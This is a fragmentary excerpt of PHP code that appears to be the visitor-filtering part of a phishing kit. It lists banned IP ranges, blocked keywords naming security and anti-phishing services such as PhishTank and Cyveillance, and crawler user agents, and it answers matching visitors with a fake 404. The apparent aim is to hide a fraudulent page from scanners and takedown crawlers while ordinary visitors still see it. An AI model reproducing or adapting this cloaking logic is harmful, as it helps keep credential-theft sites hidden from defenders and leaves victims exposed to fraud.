...
"^158.247.7.200","^40.71.11.169","^52.96.214.50","^204.79.197.212","^20.112.52.29","^172.67.75.122",
"^54.82.182.243" ,"^64.233.173.*" , "^64.68.90.*");
...
$blocked_words = array("zimbra","microsoft","outlook","hotmail","office365","duck","duckdns","above","noip","twtr","t.ly","google","softlayer","amazonaws","cyveillance","phishtank","dreamhost","netpilot","calyxinstitute","tor-exit",);
...
if( !empty($_SERVER['HTTP_USER_AGENT']) ) {
    $userAgents = array("Zimbra","Google", "Slurp", "MSNBot", "ia_archiver", "Yandex", "Rambler");
...
"^134.170.2.199", "^65.55.85.12", "^173.194.116.149", "^216.58.211.37" ,
"^89.163.159.214", "^64.233.*.*", "^66.102.*.*", "^66.249.*.*", "^216.239.*.*" , "^216.33.229.163" ,
"^35.183.253.251", "^64.233.173.*" , "^64.68.90.*");
if(in_array($_SERVER['REMOTE_ADDR'],$bannedIP)) {
     header('HTTP/1.0 404 Not Found');
     exit();
} else {
